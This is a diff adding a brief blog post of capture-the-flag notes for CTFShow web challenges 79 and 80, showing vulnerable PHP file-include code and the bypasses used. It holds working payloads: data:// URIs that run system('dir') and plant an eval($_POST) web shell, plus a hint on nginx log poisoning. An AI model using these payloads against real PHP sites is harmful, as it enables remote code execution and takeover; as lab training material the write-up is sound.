@@ -1,0 +1,49 @@
+---
+title: "CTFSHOW-(78~81)"
+description: ""
+pubDate: "NOV 20 2024"
+image: /image/ToolUse/SSH端口转发.png
+categories:
+  - CTF
+badge: Pin
+tags: 
+  - Web
+---
+import Success from "../../../../components/blog/success.astro";
+
+# WEB
+
+## WEB79
+
+```php
+<?php
+
+highlight_file(__FILE__);
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    include($file);
+}
+```
+
+> ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdkaXInKTs/Pg==
+
+> ?file=data://text/plain,\<?= eval($_POST[1]);
+
+
+
+## WEB80
+
+```php
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    include($file);
+}
+```
+
+> 写入/var/log/nginx/access.log后访问
+
+## <font color = "#749DD6">Continued</font>
